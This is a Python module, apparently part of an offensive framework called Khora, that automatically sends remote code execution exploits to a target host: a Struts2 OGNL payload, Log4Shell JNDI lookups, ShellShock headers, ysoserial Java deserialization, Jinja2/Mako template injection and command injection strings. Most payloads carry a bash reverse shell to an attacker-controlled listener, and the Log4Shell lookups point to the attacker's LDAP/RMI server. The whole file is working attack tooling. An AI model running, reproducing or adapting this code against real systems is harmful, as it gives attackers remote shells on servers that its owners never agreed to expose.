"""
RCE Module - Remote Code Execution Exploitation
Struts2, Log4Shell, ShellShock, Java Deserialization, SSTI, Command Injection
"""

import requests
import subprocess
import time
import logging
import json
from pathlib import Path

logger = logging.getLogger("Khora.RCE")

def _send_request(method, url, headers=None, data=None, json_data=None, timeout=10):
    try:
        if method == 'post':
            return requests.post(url, headers=headers, data=data, json=json_data, timeout=timeout)
        return requests.get(url, headers=headers, params=data, timeout=timeout)
    except Exception as e:
        logger.debug(f"HTTP request failed: {e}")
        return None


def struts2_exploit(target, lhost, lport):
    """Apache Struts2 RCE - CVE-2017-5638"""
    print(f"\n[*] Struts2 Exploitation (CVE-2017-5638)")
    endpoints = ['/', '/action/', '/struts/', '/s2/admin/', '/admin.action']
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload = (
        f"%{{(#_='multipart/form-data',#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
        f"#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'],"
        f"#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class),"
        f"#ognlUtil.getExcludedPackageNames().clear(),#ognlUtil.getExcludedClasses().clear(),"
        f"#context.setMemberAccess(#dm)),(#a=@java.lang.Runtime@getRuntime().exec('{cmd}')))}}"
    )
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': payload
    }
    body = {'file': 'test'}

    success = False
    for endpoint in endpoints:
        url = f"http://{target}{endpoint}"
        print(f"  [+] Trying: {url}")
        response = _send_request('post', url, headers=headers, data=body)
        if response is None:
            continue
        logger.info(f"Struts2 payload sent to {url} - status {response.status_code}")
        if response.status_code in [200, 201, 202, 400, 500]:
            print(f"  [✓] Payload accepted (HTTP {response.status_code})")
            success = True
            break
        print(f"  [!] Unexpected status {response.status_code}")

    if not success:
        logger.warning("Struts2 exploitation attempt did not receive confirmation")
    return success

def log4shell_exploit(target, lhost, lport):
    """Log4Shell RCE - CVE-2021-44228"""
    print(f"\n[*] Log4Shell Exploitation (CVE-2021-44228)")
    payloads = [
        f"${{jndi:ldap://{lhost}:1389/Exploit}}",
        f"${{jndi:rmi://{lhost}:1099/Exploit}}",
        f"${{jndi:ldaps://{lhost}:636/Exploit}}"
    ]
    endpoints = ['/api/log', '/error', '/search', '/message', '/login', '/submit', '/api/v1/events']
    headers = {'User-Agent': 'Mozilla/5.0'}
    success = False

    for endpoint in endpoints:
        for payload in payloads:
            url = f"http://{target}{endpoint}"
            print(f"  [+] Trying: {url}")
            response = _send_request('post', url, headers=headers, json_data={'message': payload, 'user': payload}, timeout=7)
            if response is None:
                continue
            logger.info(f"Log4Shell payload sent to {url} - status {response.status_code}")
            if response.status_code in [200, 201, 202, 400, 500]:
                print(f"  [✓] Payload delivered (HTTP {response.status_code}). Verify callback on LDAP/RMI listener.")
                success = True
                break
            print(f"  [!] Response code {response.status_code}")
        if success:
            break

    if not success:
        logger.warning("Log4Shell exploitation attempt did not receive confirmation")
    return success

def shellshock_exploit(target, lhost, lport):
    """Bash ShellShock RCE - CVE-2014-6271"""
    print(f"\n[*] ShellShock Exploitation (CVE-2014-6271)")
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload = f"() {{ :; }}; {cmd}"
    headers = {
        'User-Agent': payload,
        'Referer': payload,
    }
    endpoints = ['/cgi-bin/test.sh', '/cgi-bin/status.sh', '/cgi-bin/admin.sh', '/cgi-bin/example.sh']
    success = False

    for endpoint in endpoints:
        url = f"http://{target}{endpoint}"
        print(f"  [+] Trying CGI endpoint: {url}")
        response = _send_request('get', url, headers=headers, timeout=7)
        if response is None:
            continue
        logger.info(f"ShellShock payload sent to {url} - status {response.status_code}")
        if response.status_code in [200, 201, 202, 400, 500]:
            print(f"  [✓] Payload accepted (HTTP {response.status_code}). Verify callback output on listener.")
            success = True
            break
        print(f"  [!] Response code {response.status_code}")

    if not success:
        logger.warning("ShellShock exploitation attempt did not receive confirmation")
    return success

def java_rce_exploit(target, lhost, lport):
    """Java Deserialization RCE"""
    print(f"\n[*] Java Deserialization Attack")
    ysoserial = Path('tools/ysoserial.jar')
    if not ysoserial.exists():
        print("  [!] ysoserial not found. Place ysoserial.jar in tools/ and retry.")
        logger.warning("ysoserial.jar missing")
        return False

    payload_file = Path('payloads') / 'ysoserial_payload.bin'
    try:
        command = [
            'java', '-jar', str(ysoserial), 'CommonsCollections1',
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        ]
        result = subprocess.run(command, capture_output=True, text=False, timeout=20)
        if result.returncode != 0:
            stderr = result.stderr.decode('latin-1', errors='ignore') if result.stderr else 'unknown error'
            print(f"  [!] ysoserial payload generation failed: {stderr.strip()}")
            logger.error(f"ysoserial failed: {stderr}")
            return False

        payload_file.write_bytes(result.stdout)
        print(f"  [✓] Payload generated: {payload_file}")
    except Exception as e:
        print(f"  [!] Payload generation error: {e}")
        logger.error(f"Java RCE payload generation failed: {e}")
        return False

    endpoints = ['/vulnerable', '/api/deserialize', '/admin/login', '/endpoint']
    headers = {'Content-Type': 'application/x-java-serialized-object'}
    for endpoint in endpoints:
        url = f"http://{target}{endpoint}"
        print(f"  [+] Sending payload to {url}")
        response = _send_request('post', url, headers=headers, data=payload_file.read_bytes(), timeout=10)
        if response is None:
            continue
        logger.info(f"Java deserialization payload sent to {url} - status {response.status_code}")
        if response.status_code in [200, 201, 202, 400, 500]:
            print(f"  [✓] Payload delivered to {url}, verify callback or shell.")
            return True

    logger.warning("Java deserialization payload delivered but no confirmation")
    return False

def template_injection_exploit(target, lhost, lport):
    """SSTI - Server-Side Template Injection"""
    print(f"\n[*] SSTI Attack (Jinja2/Mako/Velocity)")
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payloads = {
        'Jinja2': f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
        'Mako': f"${{{{exec('import os;os.system(\"{cmd}\")')}}}}"
    }
    endpoints = ['/api/render', '/template', '/view', '/page', '/search']
    success = False

    for endpoint in endpoints:
        for tpl_type, payload in payloads.items():
            url = f"http://{target}{endpoint}"
            print(f"  [+] Trying {tpl_type} at {url}")
            response = _send_request('post', url, data={'template': payload}, timeout=7)
            if response is None:
                continue
            logger.info(f"SSTI payload sent: {tpl_type} to {url} - status {response.status_code}")
            if response.status_code in [200, 201, 202, 400, 500]:
                print(f"  [✓] Template payload delivered, verify output in response or listener.")
                success = True
                break
        if success:
            break

    if not success:
        logger.warning("SSTI exploitation attempt did not receive confirmation")
    return success

def command_injection_exploit(target, lhost, lport):
    """OS Command Injection"""
    print(f"\n[*] Command Injection Attack")
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payloads = [cmd, f"; {cmd}", f"| {cmd}", f"|| {cmd}"]
    endpoints = ['/api/ping', '/api/exec', '/api/run', '/status', '/submit']
    params = ['host', 'cmd', 'command', 'input']
    success = False

    for endpoint in endpoints:
        for param in params:
            for payload in payloads[:3]:
                url = f"http://{target}{endpoint}"
                print(f"  [+] Attempting {url} with {param}")
                response = _send_request('post', url, data={param: payload}, timeout=7)
                if response is None:
                    continue
                logger.info(f"Command injection attempt on {url} - status {response.status_code}")
                if response.status_code in [200, 201, 202, 400, 500]:
                    print(f"  [✓] Payload delivered, verify callback on listener.")
                    success = True
                    break
            if success:
                break
        if success:
            break

    if not success:
        logger.warning("Command injection exploitation attempt did not receive confirmation")
    return success

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - RCE Module"""
    print(f"\n{'='*70}")
    print("REMOTE EXECUTION MODULE".center(70))
    print('='*70)
    print(f"Target: {target}")
    print(f"Listener: {lhost}:{lport}\n")
    
    logger.info(f"Starting RCE module on {target}")
    
    exploits = [
        ("Struts2 (CVE-2017-5638)", struts2_exploit),
        ("Log4Shell (CVE-2021-44228)", log4shell_exploit),
        ("ShellShock (CVE-2014-6271)", shellshock_exploit),
        ("Template Injection (SSTI)", template_injection_exploit),
        ("Command Injection", command_injection_exploit),
        ("Java Deserialization", java_rce_exploit),
    ]
    
    success_count = 0
    
    for exploit_name, exploit_func in exploits:
        try:
            if exploit_func(target, lhost, lport):
                success_count += 1
        except Exception as e:
            logger.error(f"{exploit_name} failed: {e}")
    
    print(f"\n{'='*70}")
    print(f"REMOTE EXECUTION REVIEW COMPLETE - {success_count} checks".center(70))
    print('='*70 + "\n")
    
    logger.info(f"RCE module completed")
